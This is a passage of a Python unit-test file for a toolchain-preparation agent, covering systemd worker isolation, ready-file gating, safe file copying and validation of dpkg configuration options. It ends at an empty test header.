            with self.subTest(ecosystem=ecosystem), mock.patch.object(self.c, 'pathlib', types.SimpleNamespace(Path=Path)), mock.patch.object(self.c, 'AGENT_ALIAS', Path('/run/wtl-agent-toolchain')), mock.patch.object(self.c, 'agent_manifest', return_value=manifest), mock.patch.object(self.c, 'agent_wait_ready'), mock.patch.object(self.c, 'agent_regular', return_value=json.dumps(identity).encode()), mock.patch.object(self.c.os, 'geteuid', return_value=123, create=True), mock.patch.object(self.c.os, 'getuid', return_value=123, create=True), mock.patch.object(self.c.os, 'getgid', return_value=123, create=True), mock.patch.object(self.c.os, 'chdir') as chdir, mock.patch.object(self.c.shutil, 'copytree'), mock.patch.object(self.c.os, 'walk', return_value=[]), mock.patch.object(self.c, 'agent_vendor', vendor), contextlib.redirect_stdout(io.StringIO()):
                self.c.agent_worker(OPERATION)
                chdir.assert_called_once_with('/run/wtl-agent-toolchain/work')
            self.assertTrue(any(command[0].startswith('/final/' + ecosystem) for command in commands))
            if layouts[ecosystem] in ('python', 'php', 'ruby'):
                self.assertTrue(any('--prefix=/final/' + ecosystem in command for command in commands))
                self.assertTrue(any(command == ['/usr/bin/make', 'install'] for command in commands))
            if ecosystem == 'RUST':
                self.assertTrue(any('--disable-ldconfig' in command for command in commands))
            if ecosystem == 'RUBY':
                self.assertTrue(any('--local' in command and '--ignore-dependencies' in command for command in commands))

    def test_internal_hardlinks_are_copied_to_independent_exclusive_output_files(self):
        entry = info(links=2, size=4)
        entries = {'a': (entry, None), 'b': (entry, None)}
        opened, reads, content = [], collections.defaultdict(int), {}
        def opening(name, flags, mode=None, dir_fd=None):
            target = dir_fd == 2
            fd = (20 if target else 10) + ('a', 'b').index(name)
            opened.append((name, target, flags, fd))
            return fd
        def reading(fd, _):
            reads[fd] += 1
            return b'data' if reads[fd] == 1 else b''
        class Sink:
            def __init__(self, fd): self.fd = fd
            def __enter__(self): return self
            def __exit__(self, *_): pass
            def write(self, value): content[self.fd] = content.get(self.fd, b'') + value
        with (mock.patch.object(self.c.os, 'O_NOFOLLOW', 0x20000, create=True),
              mock.patch.object(self.c.os, 'listdir', return_value=['a', 'b']),
              mock.patch.object(self.c.os, 'stat', return_value=entry),
              mock.patch.object(self.c.os, 'fstat', return_value=entry),
              mock.patch.object(self.c.os, 'open', opening), mock.patch.object(self.c.os, 'read', reading),
              mock.patch.object(self.c.os, 'dup', side_effect=lambda fd: fd),
              mock.patch.object(self.c.os, 'fdopen', side_effect=lambda fd, _: Sink(fd)),
              mock.patch.object(self.c.os, 'fchmod', create=True), mock.patch.object(self.c.os, 'fsync'),
              mock.patch.object(self.c.os, 'close'), mock.patch.object(self.c.os, 'link') as link):
            digest = self.c.agent_copy_tree(1, 2, entries)
        self.assertEqual({20: b'data', 21: b'data'}, content)
        self.assertTrue(all(flags & os.O_EXCL for _, target, flags, _ in opened if target))
        self.assertRegex(digest, r'^[a-f0-9]{64}$')
        link.assert_not_called()

    def test_detach_failure_leaves_only_hidden_stage_and_never_renames_visible_marker(self):
        manifest = self.manifest()
        class Path:
            def __init__(self, path): self.path = str(path)
            def __truediv__(self, part): return Path(self.path + '/' + part)
            def __str__(self): return self.path
            def exists(self): return False
            def is_symlink(self): return False
            def mkdir(self, **_): pass
            def iterdir(self): return iter(())
        destination = Path('/root/versions/rust-final')
        writes = []
        with (mock.patch.object(self.c, 'ROOT', Path('/root')),
              mock.patch.object(self.c, 'agent_stopped'),
              mock.patch.object(self.c, 'agent_identity', return_value=[5, 1]),
              mock.patch.object(self.c.os, 'O_DIRECTORY', 0x10000, create=True),
              mock.patch.object(self.c.os, 'O_NOFOLLOW', 0x20000, create=True),
              mock.patch.object(self.c.os, 'open', return_value=99),
              mock.patch.object(self.c.os, 'fchmod', create=True), mock.patch.object(self.c.os, 'fsync'),
              mock.patch.object(self.c.os, 'close'), mock.patch.object(self.c, 'agent_scan', return_value={'x': (info(), None)}),
              mock.patch.object(self.c, 'agent_require_space'),
              mock.patch.object(self.c, 'agent_copy_tree', return_value='a' * 64),
              mock.patch.object(self.c, 'agent_write', side_effect=lambda path, _: writes.append(str(path))),
              mock.patch.object(self.c, 'agent_detach', side_effect=self.c.PreparationFailure('unknown', 'VOLUME_STILL_ATTACHED')),
              mock.patch.object(self.c.os, 'rename') as rename):
            self.rejected('VOLUME_STILL_ATTACHED', lambda: self.c.agent_promote(manifest, destination, [5, 1], {}))
        self.assertEqual(1, len(writes))
        self.assertIn('/.agent-promote-' + OPERATION + '/', writes[0])
        rename.assert_not_called()

    def test_failed_official_download_does_not_create_final_key_placeholder(self):
        manifest = self.manifest()
        created = []
        class Path:
            def __init__(self, value): self.value = str(value)
            def __str__(self): return self.value
            def __truediv__(self, part): return Path(self.value + '/' + part)
            def exists(self): return False
            def is_symlink(self): return False
            def mkdir(self, **_): created.append(self.value)
        with mock.patch.object(self.c, 'ROOT', Path('/root')), mock.patch.object(self.c, 'agent_system', return_value=None), mock.patch.object(self.c, 'agent_release_source', side_effect=self.c.PreparationFailure('network', 'DOWNLOAD_FAILED')), mock.patch.object(self.c, 'agent_execute') as execute:
            self.rejected('DOWNLOAD_FAILED', lambda: self.c.agent_prepare_selected(manifest, 'RUST',
                '1.95.0', 'https://static.rust-lang.org/archive', 'sha256', 'a' * 64, 'rust', '-'))
        self.assertEqual([], created)
        execute.assert_not_called()

    def test_placeholder_cleanup_is_exact_current_operation_inode_and_empty_only(self):
        manifest = self.manifest()
        target = str(self.c.ROOT) + '/versions/rust-' + 'a' * 64
        record = {'operation': OPERATION, 'ecosystem': 'RUST', 'version': '1.95.0',
            'directory': target, 'identity': [5, 9]}
        removed = []
        nonempty = []
        class Path:
            def __init__(self, path): self.path = path
            def __truediv__(self, part): return Path(self.path + '/' + part)
            def __str__(self): return self.path
            def exists(self): return True
            def iterdir(self): return iter(nonempty)
            def rmdir(self): removed.append(self.path)
        with mock.patch.object(self.c, 'agent_operation', return_value=Path('/root/current')), mock.patch.object(self.c, 'pathlib', types.SimpleNamespace(Path=Path)), mock.patch.object(self.c, 'agent_regular', side_effect=lambda _: json.dumps(record).encode()), mock.patch.object(self.c, 'agent_selection'), mock.patch.object(self.c, 'agent_identity', return_value=[5, 9]):
            self.c.agent_cleanup_placeholder(manifest)
            self.assertEqual([target], removed)
            nonempty.append('unsettled')
            self.rejected('PLACEHOLDER_CHANGED', lambda: self.c.agent_cleanup_placeholder(manifest))
            nonempty.clear()
            record['operation'] = 'f' * 32
            self.rejected('PLACEHOLDER_BINDING', lambda: self.c.agent_cleanup_placeholder(manifest))
        record['operation'] = OPERATION
        with mock.patch.object(self.c, 'agent_operation', return_value=Path('/root/current')), mock.patch.object(self.c, 'pathlib', types.SimpleNamespace(Path=Path)), mock.patch.object(self.c, 'agent_regular', return_value=json.dumps(record).encode()), mock.patch.object(self.c, 'agent_selection'), mock.patch.object(self.c, 'agent_identity', return_value=[5, 99]):
            self.rejected('PLACEHOLDER_CHANGED', lambda: self.c.agent_cleanup_placeholder(manifest))
        self.assertEqual([target], removed)

    def test_prestart_cleanup_only_runs_before_any_unit_intent(self):
        manifest = self.manifest()
        class Path:
            def __init__(self, path): self.path = path
            def __truediv__(self, part): return Path(self.path + '/' + part)
            def __str__(self): return self.path
            def exists(self): return False
            def is_symlink(self): return False
            def iterdir(self): return iter(())
            def unlink(self): calls.append('unlink:' + self.path)
        calls = []
        original = {'operation': OPERATION, 'uid': 0, 'gid': 0, 'programSha256': manifest['programSha256']}
        def command(args, **_):
            calls.append(args)
            return 0, b'not-found\n' if 'systemctl' in args[0] else b''
        def inode(path):
            return manifest['directories'][str(path).rsplit('/', 1)[-1]]
        with mock.patch.object(self.c, 'agent_operation', return_value=Path('/root/current')), mock.patch.object(self.c, 'agent_regular', return_value=json.dumps(original).encode()), mock.patch.object(self.c, 'agent_tool', lambda name: '/usr/bin/' + name), mock.patch.object(self.c, 'agent_os', command), mock.patch.object(self.c, 'agent_volume'), mock.patch.object(self.c, 'agent_identity', inode), mock.patch.object(self.c, 'agent_write'):
            self.assertTrue(self.c.agent_cleanup_before_start(manifest))
        verbs = [value[0].rsplit('/', 1)[-1] for value in calls if isinstance(value, list)]
        self.assertEqual(['systemctl', 'mount', 'umount', 'findmnt', 'losetup', 'losetup'], verbs)
        self.assertEqual('unlink:/root/current/volume.ext4', calls[-1])


    def unit_output(self, **changes):
        values = {'Id': self.c.agent_unit(OPERATION), 'LoadState': 'loaded', 'ActiveState': 'active',
            'User': self.c.agent_user(OPERATION), 'Group': self.c.agent_user(OPERATION), 'DynamicUser': 'yes',
            'UID': '1234', 'GID': '1234', 'InvocationID': 'e' * 32, 'MainPID': '4567',
            'ControlGroup': '/system.slice/' + self.c.agent_unit(OPERATION)}
        values.update(changes)
        return ''.join(key + '=' + value + '\n' for key, value in values.items()).encode()

    @contextlib.contextmanager
    def execution(self, manifest, code=0, output=None, error=None):
        events = []
        identity = {'uid': 1234, 'gid': 1234, 'invocationId': 'e' * 32}
        if output is None:
            output = ('WORKER_OK=' + manifest['programSha256'] + '\n').encode()
        def command(args, **kwargs):
            if args[0].endswith('/systemd-run'):
                events.append('start')
                kwargs['on_poll']()
                kwargs['on_poll']()
                events.append('worker')
                if error is not None:
                    raise error
                return code, output
            self.assertEqual('stop', args[1])
            events.append('stop')
            return 0, b''
        with mock.patch.object(self.c, 'agent_tool', lambda name: '/usr/bin/' + name), \
             mock.patch.object(self.c, 'agent_write', side_effect=lambda *_: events.append('intent')), \
             mock.patch.object(self.c, 'agent_os', side_effect=command), \
             mock.patch.object(self.c, 'agent_unit_identity', return_value=identity), \
             mock.patch.object(self.c, 'agent_setup', side_effect=lambda *_: events.append('setup')), \
             mock.patch.object(self.c, 'agent_publish_ready', side_effect=lambda *_: events.append('ready')), \
             mock.patch.object(self.c, 'agent_unit_stopped', side_effect=lambda *_: events.append('empty')), \
             mock.patch.object(self.c, 'agent_freeze', side_effect=lambda *_: events.append('freeze')), \
             mock.patch.object(self.c, 'agent_stopped', side_effect=lambda *_: events.append('frozen-proof')):
            yield events

    @contextlib.contextmanager
    def ready_storage(self, manifest, data=b'', inode=12, links=1, mode=0o444, uid=0):
        state = {'data': data, 'inode': inode, 'links': links, 'mode': mode, 'uid': uid, 'short': False}
        locks, actions = [], []
        def status(_):
            value = info(mode=stat.S_IFREG | state['mode'], inode=state['inode'], links=state['links'], size=len(state['data']))
            value.st_uid, value.st_gid = state['uid'], 0
            return value
        def writing(_, value):
            actions.append('write')
            state['data'] = value[:-1] if state['short'] else value
            return len(state['data'])
        fcntl = types.SimpleNamespace(LOCK_SH=1, LOCK_EX=2, LOCK_NB=4,
            flock=mock.Mock(side_effect=lambda fd, flag: locks.append(flag)))
        with mock.patch.dict('sys.modules', {'fcntl': fcntl}), \
             mock.patch.object(self.c.os, 'O_NOFOLLOW', 0x20000, create=True), \
             mock.patch.object(self.c.os, 'open', return_value=42), \
             mock.patch.object(self.c.os, 'fstat', side_effect=status), \
             mock.patch.object(self.c.os, 'read', side_effect=lambda *_: state['data']), \
             mock.patch.object(self.c.os, 'write', side_effect=writing), \
             mock.patch.object(self.c.os, 'fsync', side_effect=lambda *_: actions.append('fsync')), \
             mock.patch.object(self.c.os, 'close'), \
             mock.patch.object(self.c.os, 'geteuid', return_value=0, create=True):
            yield state, locks, actions, fcntl

    def test_poll_hook_runs_without_output_and_preserves_captured_exception_metadata(self):
        with self.system_process(b'private-output', 70) as (process, _, _):
            process.poll.side_effect = [None, None, 70, 70]
            polling = mock.Mock(side_effect=[None, OSError(2, '/private/callback')])
            with self.assertRaises(OSError) as failed:
                self.c.agent_os(['/usr/bin/systemd-run'], allow_failure=True, on_poll=polling)
        self.assertEqual(2, polling.call_count)
        self.assertEqual({'exitCode': 70, 'outputBytes': 14,
            'outputSha256': hashlib.sha256(b'private-output').hexdigest()}, failed.exception.run_observation)
        with self.system_process(b'', 0) as (process, _, _), \
             mock.patch.object(self.c.selectors, 'DefaultSelector') as selectors:
            selector = selectors.return_value.__enter__.return_value
            selector.get_map.side_effect = [{1: True}, {}]
            selector.select.return_value = []
            process.poll.side_effect = [None, 0]
            polling = mock.Mock()
            with mock.patch.object(self.c.os, 'killpg', create=True):
                self.assertEqual((0, b''), self.c.agent_os(['/usr/bin/systemd-run'], on_poll=polling))
            polling.assert_called_once_with()

    def test_unit_identity_requires_current_systemd_identity_and_complete_shape(self):
        expected = {'uid': 1234, 'gid': 1234, 'invocationId': 'e' * 32}
        with mock.patch.object(self.c, 'agent_tool', lambda name: '/usr/bin/' + name), \
             mock.patch.object(self.c, 'agent_os', return_value=(0, self.unit_output())) as command:
            self.assertEqual(expected, self.c.agent_unit_identity(self.manifest()))
            self.assertEqual(self.c.agent_unit(OPERATION), command.call_args.args[0][-1])
        bad = [{'Id': 'foreign.service'}, {'User': 'root'}, {'Group': 'root'}, {'DynamicUser': 'no'},
               {'UID': '0'}, {'GID': '-1'}, {'InvocationID': '0' * 32}, {'MainPID': '../1'},
               {'ControlGroup': '/foreign'}, {'ActiveState': 'failed'}]
        for values in bad:
            with self.subTest(values=values), mock.patch.object(self.c, 'agent_tool', lambda n: '/usr/bin/' + n), \
                 mock.patch.object(self.c, 'agent_os', return_value=(0, self.unit_output(**values))):
                self.rejected('UNIT_IDENTITY', lambda: self.c.agent_unit_identity(self.manifest()))
        for output in (self.unit_output() + b'UID=1234\n', self.unit_output() + b'Unknown=value\n'):
            with mock.patch.object(self.c, 'agent_tool', lambda n: '/usr/bin/' + n), mock.patch.object(self.c, 'agent_os', return_value=(0, output)):
                self.rejected('UNIT_IDENTITY', lambda: self.c.agent_unit_identity(self.manifest()))
        for values in ({'UID': '4294967295'}, {'MainPID': '0'}, {'LoadState': 'not-found', 'ActiveState': 'inactive'}):
            with mock.patch.object(self.c, 'agent_tool', lambda n: '/usr/bin/' + n), mock.patch.object(self.c, 'agent_os', return_value=(0, self.unit_output(**values))):
                self.assertIsNone(self.c.agent_unit_identity(self.manifest()))

    def test_ready_file_locks_single_publication_and_rejects_links_replacement_and_short_write(self):
        manifest = self.manifest()
        with self.ready_storage(manifest) as (state, locks, actions, _):
            self.assertEqual(b'', self.c.agent_ready_file(manifest, alias=True))
            self.c.agent_ready_file(manifest, b'complete-record')
            self.assertEqual(b'complete-record', self.c.agent_ready_file(manifest, alias=True))
            self.assertEqual([5, 6, 5], locks)
            self.assertEqual(['write', 'fsync'], actions)
            self.rejected('READY_ALREADY_PUBLISHED', lambda: self.c.agent_ready_file(manifest, b'again'))
        for invalid in ({'inode': 13}, {'links': 2}, {'mode': 0o644}, {'uid': 1234}):
            with self.subTest(invalid=invalid), self.ready_storage(manifest, **invalid) as (_, _, actions, _):
                self.rejected('READY_FILE', lambda: self.c.agent_ready_file(manifest, b'value'))
                self.assertEqual([], actions)
        with self.ready_storage(manifest) as (state, _, actions, _):
            state['short'] = True
            self.rejected('READY_SHORT_WRITE', lambda: self.c.agent_ready_file(manifest, b'complete'))
            self.assertNotIn('fsync', actions)

    def test_ready_lock_wait_obeys_deadline_without_reading_or_writing_unlocked(self):
        with self.ready_storage(self.manifest()) as (_, _, actions, fcntl), \
             mock.patch.object(self.c, 'remaining', side_effect=self.c.PreparationFailure('timeout', 'DEADLINE_EXHAUSTED')):
            fcntl.flock.side_effect = BlockingIOError()
            self.rejected('DEADLINE_EXHAUSTED', lambda: self.c.agent_ready_file(self.manifest(), b'value'))
            self.assertEqual([], actions)

    def test_ready_gate_requires_exact_source_operation_and_actual_worker_identity(self):
        manifest = self.manifest()
        value = {'operation': OPERATION, 'programSha256': manifest['programSha256'],
            'uid': 1234, 'gid': 1234, 'invocationId': 'e' * 32}
        with mock.patch.object(self.c.os, 'getuid', return_value=1234, create=True), \
             mock.patch.object(self.c.os, 'getgid', return_value=1234, create=True), \
             mock.patch.object(self.c, 'agent_ready_file', side_effect=[b'', self.c.agent_encode(value)]), \
             mock.patch.object(self.c.time, 'sleep') as sleep:
            self.c.agent_wait_ready(manifest)
            sleep.assert_called_once_with(0.05)
        invalid = [dict(value, operation='f' * 32), dict(value, programSha256='f' * 64), dict(value, uid=0),
                   dict(value, uid=True), dict(value, gid=999), dict(value, invocationId='0' * 32), dict(value, extra=True)]
        for record in invalid:
            with self.subTest(record=record), mock.patch.object(self.c.os, 'getuid', return_value=1234, create=True), \
                 mock.patch.object(self.c.os, 'getgid', return_value=1234, create=True), \
                 mock.patch.object(self.c, 'agent_ready_file', return_value=self.c.agent_encode(record)):
                with self.assertRaises(self.c.PreparationFailure):
                    self.c.agent_wait_ready(manifest)

    def test_worker_cannot_run_vendor_before_the_root_gate_or_after_invalid_gate(self):
        with mock.patch.object(self.c.os, 'geteuid', return_value=1234, create=True), \
             mock.patch.object(self.c, 'agent_manifest', return_value=self.manifest()), \
             mock.patch.object(self.c, 'agent_wait_ready', side_effect=self.c.PreparationFailure('unknown', 'READY_BINDING')), \
             mock.patch.object(self.c, 'agent_regular') as read_identity, \
             mock.patch.object(self.c, 'agent_vendor') as vendor:
            self.rejected('READY_BINDING', lambda: self.c.agent_worker(OPERATION))
            read_identity.assert_not_called()
            vendor.assert_not_called()

    def test_host_lifecycle_orders_one_setup_gate_stop_empty_freeze_and_proof(self):
        with self.execution(self.manifest()) as events:
            self.c.agent_execute(self.manifest())
        self.assertEqual(['intent', 'start', 'setup', 'ready', 'worker', 'stop', 'empty', 'freeze', 'frozen-proof'], events)

    def test_unit_change_after_setup_prevents_ready_and_keeps_unknown(self):
        identity = {'uid': 1234, 'gid': 1234, 'invocationId': 'e' * 32}
        with mock.patch.object(self.c, 'agent_unit_identity', return_value=dict(identity, invocationId='f' * 32)), \
             mock.patch.object(self.c, 'agent_ready_file') as write:
            self.rejected('UNIT_IDENTITY_CHANGED', lambda: self.c.agent_publish_ready(self.manifest(), identity))
            write.assert_not_called()
        with self.execution(self.manifest()) as events, \
             mock.patch.object(self.c, 'agent_publish_ready', side_effect=self.c.PreparationFailure('unknown', 'UNIT_IDENTITY_CHANGED')):
            self.rejected('AGENT_SETUP_UNCONFIRMED', lambda: self.c.agent_execute(self.manifest()))
        self.assertIn('empty', events)
        self.assertNotIn('freeze', events)
        self.assertNotIn('worker', events)

    def test_stop_failure_preserves_actual_run_exit_and_digest_and_never_freezes(self):
        private = b'PRIVATE_VENDOR_BODY /private/path'
        for code in (0, 70):
            with self.subTest(code=code), self.execution(self.manifest(), code, private) as events, \
                 mock.patch.object(self.c, 'agent_unit_stopped', side_effect=OSError(2, 'missing')):
                with self.assertRaises(self.c.PreparationFailure) as failed:
                    self.c.agent_execute(self.manifest())
            self.assertEqual('AGENT_STOP_UNCONFIRMED', failed.exception.detail)
            self.assertEqual({'operation': OPERATION, 'phase': 'AGENT_STOP_UNCONFIRMED', 'command': 'systemd-run',
                'exitCode': code, 'outputBytes': len(private), 'outputSha256': hashlib.sha256(private).hexdigest()}, failed.exception.lifecycle_diagnostic)
            self.assertNotIn('freeze', events)

    def test_unknown_execution_and_known_worker_failure_keep_distinct_outcomes(self):
        error = OSError(2, 'private-body')
        error.run_observation = {'exitCode': None, 'outputBytes': 5, 'outputSha256': hashlib.sha256(b'prior').hexdigest()}
        with self.execution(self.manifest(), error=error) as events:
            with self.assertRaises(self.c.PreparationFailure) as failed:
                self.c.agent_execute(self.manifest())
        self.assertEqual('AGENT_EXECUTION_UNCONFIRMED', failed.exception.detail)
        self.assertIsNone(failed.exception.lifecycle_diagnostic['exitCode'])
        self.assertEqual('frozen-proof', events[-1])
        with self.execution(self.manifest(), code=2, output=b'actual failure'):
            with self.assertRaises(self.c.PreparationFailure) as failed:
                self.c.agent_execute(self.manifest())
        self.assertEqual(('installation', 'NONROOT_WORKER_FAILED'), (failed.exception.category, failed.exception.detail))

    def test_lifecycle_diagnostic_is_strict_current_unknown_metadata_without_private_output(self):
        args = ['prepare', 'RUST', '1.95', '1.95.0', '60', '-', OPERATION, 'private-descriptor']
        observation = {'exitCode': None, 'outputBytes': 0, 'outputSha256': hashlib.sha256(b'').hexdigest()}
        for phase in self.c.AGENT_LIFECYCLE_PHASES:
            error = self.c.agent_lifecycle_failure(self.manifest(), phase, observation)
            stream = io.StringIO()
            with mock.patch.object(self.c, 'agent_main', side_effect=error), contextlib.redirect_stdout(stream):
                self.assertEqual(70, self.c.agent_cli(args))
            lines = stream.getvalue().splitlines()
            self.assertEqual('TOOLCHAIN_FAILURE=unknown:' + phase, lines[0])
            self.assertEqual(error.lifecycle_diagnostic, json.loads(lines[1].removeprefix('TOOLCHAIN_DIAGNOSTIC=')))
            self.assertNotIn('private', stream.getvalue())
        error = self.c.agent_lifecycle_failure(self.manifest(), 'AGENT_STOP_UNCONFIRMED', observation)
        good = dict(error.lifecycle_diagnostic)
        for field, invalid in (('exitCode', True), ('exitCode', 256), ('outputBytes', 65537), ('outputBytes', -1),
                ('outputSha256', 'private'), ('command', 'mount'), ('operation', 'f' * 32), ('extra', 'private')):
            error.lifecycle_diagnostic = dict(good, **{field: invalid})
            self.assertIsNone(self.c.agent_lifecycle_diagnostic(error, args))
        error.lifecycle_diagnostic = good
        error.category = 'isolation'
        self.assertIsNone(self.c.agent_lifecycle_diagnostic(error, args))

    def test_nonempty_cgroup_never_reaches_host_freeze_or_frozen_receipt(self):
        class Group(pathlib.PurePosixPath):
            def exists(self): return True
            def rglob(self, _): return [self / 'cgroup.procs']
            def read_text(self): return '1234\n'
        response = ('LoadState=loaded\nActiveState=inactive\nControlGroup=/system.slice/' + self.c.agent_unit(OPERATION) + '\n').encode()
        with mock.patch.object(self.c.pathlib, 'Path', Group), \
             mock.patch.object(self.c, 'agent_tool', lambda n: '/usr/bin/' + n), \
             mock.patch.object(self.c, 'agent_os', return_value=(0, response)), \
             mock.patch.object(self.c, 'agent_regular') as receipt:
            self.rejected('CGROUP_NOT_EMPTY', lambda: self.c.agent_stopped(self.manifest()))
            receipt.assert_not_called()

    def test_early_run_exit_without_setup_keeps_real_zero_or_nonzero_unknown(self):
        output = b'private startup failure'
        for code in (0, 70):
            def command(args, **kwargs):
                return (code, output) if args[0].endswith('/systemd-run') else (0, b'')
            with self.subTest(code=code), self.execution(self.manifest()) as events, \
                 mock.patch.object(self.c, 'agent_os', side_effect=command):
                with self.assertRaises(self.c.PreparationFailure) as failed:
                    self.c.agent_execute(self.manifest())
            self.assertEqual('AGENT_SETUP_UNCONFIRMED', failed.exception.detail)
            self.assertEqual(code, failed.exception.lifecycle_diagnostic['exitCode'])
            self.assertEqual(hashlib.sha256(output).hexdigest(), failed.exception.lifecycle_diagnostic['outputSha256'])
            self.assertEqual(['intent', 'empty'], events)

    def test_empty_ready_until_deadline_never_reaches_vendor_or_identity_reads(self):
        with mock.patch.object(self.c.os, 'geteuid', return_value=1234, create=True), \
             mock.patch.object(self.c, 'agent_manifest', return_value=self.manifest()), \
             mock.patch.object(self.c, 'agent_ready_file', return_value=b''), \
             mock.patch.object(self.c, 'remaining', side_effect=[1, self.c.PreparationFailure('timeout', 'DEADLINE_EXHAUSTED')]), \
             mock.patch.object(self.c.time, 'sleep'), \
             mock.patch.object(self.c, 'agent_regular') as identity, \
             mock.patch.object(self.c, 'agent_vendor') as vendor:
            self.rejected('DEADLINE_EXHAUSTED', lambda: self.c.agent_worker(OPERATION))
            identity.assert_not_called()
            vendor.assert_not_called()

    def test_expired_budget_does_not_spawn_and_exit_race_keeps_original_observation(self):
        with mock.patch.object(self.c, 'remaining', side_effect=self.c.PreparationFailure('timeout', 'DEADLINE_EXHAUSTED')), \
             mock.patch.object(self.c.subprocess, 'Popen') as spawn:
            self.rejected('DEADLINE_EXHAUSTED', lambda: self.c.agent_os(['/usr/bin/systemd-run']))
            spawn.assert_not_called()
        with self.system_process(b'data', 70) as (process, _, kill), \
             mock.patch.object(self.c.signal, 'SIGKILL', 9, create=True):
            process.poll.side_effect = [None, None, None]
            kill.side_effect = ProcessLookupError()
            with self.assertRaises(OSError) as failed:
                self.c.agent_os(['/usr/bin/systemd-run'], on_poll=mock.Mock(side_effect=OSError(2, 'private')))
            self.assertEqual(2, failed.exception.errno)
            self.assertEqual({'exitCode': None, 'outputBytes': 0, 'outputSha256': hashlib.sha256(b'').hexdigest()}, failed.exception.run_observation)


class AgentToolchainDependenciesTest(unittest.TestCase):
    def setUp(self):
        self.d, self.source = dependencies()
        self.d.OS_PROFILE = {'id': 'ubuntu', 'version': '24.04', 'manager': 'APT'}

    def rejected(self, call):
        with self.assertRaises(self.d.DependencyFailure):
            call()

    @contextlib.contextmanager
    def dpkg_configuration(self, content, registration_error=None):
        with mock.patch.object(self.d.pathlib.Path, 'exists', lambda path: path.as_posix() == '/etc/dpkg/dpkg.cfg'), \
             mock.patch.object(self.d.pathlib.Path, 'is_dir', return_value=False), \
             mock.patch.object(self.d, 'dependency_protected'), \
             mock.patch.object(self.d, 'dependency_text', return_value=content), \
             mock.patch.object(self.d, 'dependency_registered', side_effect=registration_error) as registered:
            yield registered

    def test_dpkg_official_status_logger_requires_whole_file_registration(self):
        logger = 'status-logger=(test -x /usr/lib/needrestart/dpkg-status && /usr/lib/needrestart/dpkg-status || cat > /dev/null)'
        self.assertEqual(111, len(logger.encode('utf-8')))
        self.assertEqual('a17b93b68537e5f00016564b13815997c4de79ecad49064dba92d432c8950f76', hashlib.sha256(logger.encode()).hexdigest())
        content = '# needrestart - Restart daemons after library updates.\n#\n# Scan for (successfully) installed packages,\n# triggers needrestart in apt\'s Dpkg::Post-Invoke\n# hook.\n\n' + logger + '\n'
        with self.dpkg_configuration(content) as registered:
            self.d.dependency_validate_dpkg()
        registered.assert_called_once_with(pathlib.Path('/etc/dpkg/dpkg.cfg'), self.d.HOOK_OWNERS, content.encode('utf-8'))

    def test_dpkg_executable_options_keep_registration_rejections_for_each_syntax(self):
        for option in ('pre-invoke', 'post-invoke', 'status-logger'):
            for separator in ('=', ' '):
                content = option + separator + '/usr/lib/registered-native-hook\n'
                with self.subTest(option=option, separator=separator), self.dpkg_configuration(content) as registered:
                    self.d.dependency_validate_dpkg()
                    registered.assert_called_once_with(pathlib.Path('/etc/dpkg/dpkg.cfg'), self.d.HOOK_OWNERS, content.encode('utf-8'))
                for code in ('OS_CONFIGURATION_OWNER', 'MODIFIED_OS_CONFIGURATION', 'UNREGISTERED_OS_CONFIGURATION'):
                    with self.subTest(option=option, separator=separator, code=code), \
                         self.dpkg_configuration(content, self.d.DependencyFailure(code)) as registered:
                        with self.assertRaises(self.d.DependencyFailure) as rejected:
                            self.d.dependency_validate_dpkg()
                        self.assertEqual(code, rejected.exception.detail)
                        registered.assert_called_once()

    def test_dpkg_option_grammar_keeps_empty_unknown_and_redirected_values_rejected(self):
        for content in ('status-logger=', 'status-logger ', 'pre-invoke=', 'post-invoke=',
                'status-logger-extra=/project/hook', 'status-fd=4', 'force-bad-verify',
                'log=/project/private.log', 'abort-after=not-a-number'):
            with self.subTest(content=content), self.dpkg_configuration(content):
                with self.assertRaises(self.d.DependencyFailure) as rejected:
                    self.d.dependency_validate_dpkg()
                self.assertEqual('UNSUPPORTED_DPKG_CONFIGURATION', rejected.exception.detail)
        for content in ('no-debsig\nlog /var/log/dpkg.log\nabort-after 50\n', 'log=/var/log/dpkg.log\nabort-after=50\n'):
            with self.subTest(content=content), self.dpkg_configuration(content) as registered:
                self.d.dependency_validate_dpkg()
                registered.assert_not_called()

    def test_dpkg_rejection_diagnostic_keeps_the_guard_and_only_hashes_the_unknown_line(self):
        private = 'unsupported-private-body'
        content = '# default comment\nno-debsig\n' + private + '\n'
        with mock.patch.object(self.d.pathlib.Path, 'exists', lambda path: path.as_posix() == '/etc/dpkg/dpkg.cfg'), \
             mock.patch.object(self.d.pathlib.Path, 'is_dir', return_value=False), \
             mock.patch.object(self.d, 'dependency_protected'), mock.patch.object(self.d, 'dependency_text', return_value=content):
            with self.assertRaises(self.d.DependencyFailure) as rejected:
                self.d.dependency_validate_dpkg()
        self.assertEqual('UNSUPPORTED_DPKG_CONFIGURATION', rejected.exception.detail)
        line = self.d.dependency_diagnostic_line(rejected.exception, ['NATIVE_BUILD', OPERATION])
        value = json.loads(line.removeprefix('TOOLCHAIN_DIAGNOSTIC='))
        self.assertEqual({'operation': OPERATION, 'phase': 'UNSUPPORTED_DPKG_CONFIGURATION', 'kind': 'MAIN', 'line': 3,
            'valueBytes': len(private), 'valueSha256': hashlib.sha256(private.encode()).hexdigest()}, value)
        self.assertNotIn(private, line)
        for field, invalid in (('kind', ['MAIN']), ('kind', 'private-body'), ('line', 0), ('line', True),
                ('valueBytes', 0), ('valueBytes', 1048577), ('valueSha256', 'private-body')):
            data = dict(rejected.exception.diagnostic)
            data[field] = invalid
            self.assertIsNone(self.d.dependency_diagnostic_line(self.d.DependencyFailure('UNSUPPORTED_DPKG_CONFIGURATION', diagnostic=data), ['NATIVE_BUILD', OPERATION]))

    @contextlib.contextmanager
    def apt_paths(self, missing=(), unsafe=(), links=None, non_executable=()):
        links = links or {}
        directories = {'/', '/usr', '/usr/bin', '/bin', '/usr/sbin', '/sbin',
                       '/usr/lib/apt/methods', '/usr/lib/apt/solvers', '/usr/lib/apt/planners'}
        class Path(pathlib.PurePosixPath):
            def exists(self): return str(self) not in missing
            def is_symlink(self): return str(self) in links
            def is_dir(self): return str(self) in directories
            def is_file(self): return str(self) not in directories
        checked = []
        def protected(path):
            checked.append(str(path))
            if str(path) in unsafe or str(path) in missing:
                self.d.dependency_reject('UNTRUSTED_OS_PATH')
            return Path(links.get(str(path), str(path)))
        with mock.patch.object(self.d, 'pathlib', types.SimpleNamespace(Path=Path)), \
             mock.patch.object(self.d, 'dependency_protected', protected), \
             mock.patch.object(self.d.os, 'access', lambda path, mode: str(path) not in non_executable):
            yield checked

    def test_apt_authentication_relaxation_and_custom_hook_are_rejected(self):
